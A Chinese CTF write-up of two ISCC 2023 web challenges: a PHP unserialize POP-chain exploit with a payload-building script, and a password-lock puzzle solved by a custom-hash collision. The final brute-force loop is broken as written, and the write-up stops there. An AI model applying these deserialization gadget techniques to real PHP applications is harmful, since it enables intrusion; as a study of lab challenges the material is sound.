# ISCC 2023

## WEB

### web3

```php
?> <?php
include("./xxxiscc.php");
class boy {
    public $like;
    public function __destruct() {
        echo "能请你喝杯奶茶吗？<br>";
        @$this->like->make_friends();
    }
    public function __toString() {
        echo "拱火大法好<br>";
        return $this->like->string;
    }
}

class girl {
    private $boyname;
    public function __call($func, $args) {
        echo "我害羞羞<br>";
        isset($this->boyname->name);  
    }
}

class helper {
    private $name;
    private $string;
    public function __construct($string) {
        $this->string = $string;
    }
    public function __isset($val) {
        echo "僚机上线<br>";
        echo $this->name;
    }
    public function __get($name) {
        echo "僚机不懈努力<br>";
        $var = $this->$name;
        $var[$name]();
    }
}
class love_story {
    public function love() {
        echo "爱情萌芽<br>";
        array_walk($this, function($make, $colo){
            echo "坠入爱河，给你爱的密码<br>";
            if ($make[0] === "girl_and_boy" && $colo === "fall_in_love") {
                global $flag;
                echo $flag;
            }
        });
    }
}

if (isset($_GET["iscc"])) {
    $a=unserialize($_GET['iscc']);
} else {
    highlight_file(__FILE__);
}
```

经典的PHP反序列化链子，我的思路如下：

1. 反序列化类销毁自动触发 boy 类的 destruct()，此时会调用 @$this->like->make_friends();

将 this->like 设为 一个 girl 类对象，此时会触发 girl 类的 __call 魔术方法。

2. 在 girl 的 __call 魔术方法中会触发 isset($this->boyname->name);

若将 this->boyname 设为 helper 类对象，此时会自动触发 helper 类的 __isset() 魔术方法，在这个方法中会调用 echo $this->name; 

如果 this->name 是一个 boy 类对象，那么此时会触发 boy 类的 __toString() 方法

3. 在 boy 类的 __toString() 方法中会调用 $this->like->string;

如果 this->like 是一个 helper 类对象，此时会自动触发该类的 __get() 魔术方法

然后调用的是

```php
$var = $this->$name;
$var[$name]();
```

$name 传进来是 “string”

所以相当于调用 $this->string，若这个值是 love_story 类对象



```php
<?php

class boy {
    public $like;
    public function __construct($a){
        $this->like = $a;
    }
    public function __destruct() {
        echo "能请你喝杯奶茶吗？<br>";
        @$this->like->make_friends();
    }
    public function __toString() {
        echo "拱火大法好<br>";

        return $this->like->string;
    }
}

class girl {
    private $boyname;
    public function __construct($a){
        $this->boyname = $a;
    }
    public function __call($func, $args) {
        echo "我害羞羞<br>";
        isset($this->boyname->name);
    }
}

class helper {
    private $name;
    private $string;
    public function __construct($name,$string) {
        $this->name = $name;
        $this->string = $string;
    }
    public function __isset($val) {
        echo "僚机上线<br>";
        echo $this->name;
    }
    public function __get($name) {

        echo "僚机不懈努力<br>";
        $var = $this->$name;
        var_dump("\n");
        var_dump($var);
        $var[$name]();
        //

    }
}
class love_story {
    public function love() {
        echo "爱情萌芽<br>";
        //$this = array("fall_in_love"=>"girl_and_boy");
        #var_dump("当前的this".$this);
        array_walk($this, function($make, $colo){
            echo "坠入爱河，给你爱的密码<br>";
            if ($make[0] === "girl_and_boy" && $colo === "fall_in_love") {
                global $flag;
                echo $flag;
            }
        }
        );
    }
}

$love_story1 = new love_story();
$test = array("string"=>"phpinfo");
$helper2 = new helper("test",$test);

$boy2 = new boy($helper2);

$helper1 = new helper($boy2,$boy2);

$girl1 = new girl($helper1);

$boy1 = new boy($girl1);


$ans = urlencode(serialize($boy1));

var_dump($ans);


```

### 小周的密码锁

传参 password=4&password=5 拿到源码。

```php
<?php
    function MyHashCode($str)
    {
        $h = 0;
        $len = strlen($str);
        for ($i = 0; $i < $len; $i++) {
            $hash = intval40(intval40(40 * $hash) + ord($str[$i]));
        }
        return abs($hash);
    }
    
    function intval40($code)
    {
        $falg = $code >> 32;
        if ($falg == 1) {
            $code = ~($code - 1);
            return $code * -1;
        } else {
            return $code;
        }
    }
    function Checked($str){
        $p1 = '/ISCC/';
        if (preg_match($p1, $str)){
            return false;
        }
        return true;
    }

    function SecurityCheck($sha1,$sha2,$user){
        
        $p1 = '/^[a-z]+$/';
        $p2 = '/^[A-Z]+$/';

        if (preg_match($p1, $sha1) && preg_match($p2, $sha2)){
            $sha1 = strtoupper($sha1);
            $sha2 = strtolower($sha2);
            $user = strtoupper($user);
            $crypto = $sha1 ^ $sha2;
        }
        else{
            die("wrong");
        }       

        return array($crypto, $user);
    }
    error_reporting(0);
    
    $user = $_GET['username'];//user
    $sha1 = $_GET['sha1'];//sha1
    $sha2 = $_GET['‮⁦//sha2⁩⁦sha2'];
    //‮⁦see me ⁩⁦can you 

    if (isset ($_GET['password'])) {
        if ($_GET['password2'] == 5){
            show_source(__FILE__);
        }
        else{
            //Try to encrypt
            if(isset($sha1) && isset($sha2) && isset($user)){
                [$crypto, $user] = SecurityCheck($sha1,$sha2,$user);
                if((substr(sha1($crypto),-6,6) === substr(sha1($user),-6,6)) && (substr(sha1($user),-6,6)) === 'a05c53'){//welcome to ISCC
                    
                    if((MyHashcode("ISCCNOTHARD") === MyHashcode($_GET['password']))&&Checked($_GET['password'])){
                        include("f1ag.php");
                        echo $flag;
                    }else{
                        die("就快解开了!");
                    }
                    
                }
                else{
                    die("真的想不起来密码了吗?");
                }
            }else{
                die("密钥错误!");
            }
        }    
    }        

    mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 1e4) + rand(1, 1e4));
?>
```



拿到 flag 的条件有两个：

1. MyHashcode("ISCCNOTHARD") === MyHashcode($_GET['password'])
2. Checked($_GET['password'])
3. (substr(sha1(\$crypto),-6,6) === substr(sha1(\$user),-6,6)
4. (substr(sha1(\$user),-6,6)) === 'a05c53')



#### 前两个条件的分析



分析一下 MyHashcode 函数：

```php
function MyHashCode($str)
    {
        $h = 0;
        $len = strlen($str);
        for ($i = 0; $i < $len; $i++) {
            $hash = intval40(intval40(40 * $hash) + ord($str[$i]));
        }
        return abs($hash);
    }
function intval40($code)
    {
        $falg = $code >> 32;
        if ($falg == 1) {
            $code = ~($code - 1);                                                                                                                         
            return $code * -1;
        } else {
            return $code;
        }
    }
```



再看看 Checked 函数：

```php
function Checked($str){
        $p1 = '/ISCC/';
        if (preg_match($p1, $str)){
            return false;
        }
        return true;
    }
```

为了通过 Checked 函数，传入的 password 不可以以 ISCC 开头，我们试着爆破一下验证码：

没爆破出来，我只能仔细分析一下相关函数，经过我的分析发现如下几个重要的特点：

1. intval40 函数对哈希值不起任何作用，所以在求哈希和的过程中可以直接略去该函数。
2. 最后的哈希和可以写成如下形式：

$h_i=40^{i-1}m_0+40^{i-2}m_1+....+40^{1}m_{i-2}+40^{0}m_{i-1}$

这可以给我们一个启发：

若我们保持 ISCCNOTHARD 除最高两位不同外其余位都相同，此时若可以找到两个字符 x 和 y，使得

$40^{10}x+40^{9}y=40^{10}*ord(I)+40^{9}*ord(S)$

那么我们就成功找到了一组哈希碰撞。下面简单地用 python 脚本试试



```python
sum = 40**10 * ord("I") + 40**9 * ord("S")
for x in range(128):
    for y in range(128):
        if (40**10 * x + 40**9 * y == sum):
            print(x,y)
            print(chr(x),chr(y))
72 123
H {
73 83
I S
74 43
J +
75 3
K 
```

验证一下果然为 ture：

```php
$target = MyHashcode("ISCCNOTHARD");
$test = MyHashCode("H{CCNOTHARD");
var_dump($target == $test); # True
```

#### 后两个条件的分析：

1. (substr(sha1(\$crypto),-6,6) === substr(sha1(\$user),-6,6)
2. (substr(sha1(\$user),-6,6)) === 'a05c53')

crypto 和 user 来自 SecurityCheck 函数：

```php
[$crypto, $user] = SecurityCheck($sha1,$sha2,$user);

function SecurityCheck($sha1,$sha2,$user){

    $p1 = '/^[a-z]+$/';
    $p2 = '/^[A-Z]+$/';
    
    if (preg_match($p1, $sha1) && preg_match($p2, $sha2)){
        $sha1 = strtoupper($sha1);
        $sha2 = strtolower($sha2);
        $user = strtoupper($user);
        $crypto = $sha1 ^ $sha2;
    }
    else{
        die("wrong");
    }

    return array($crypto, $user);
}
```



```php
for($i=-99999;$i=99999;$i++){
$tmp = substr(sha1($i),-6,6);
if($tmp == 'a05c53'){
    var_dump($i);
}
}
```

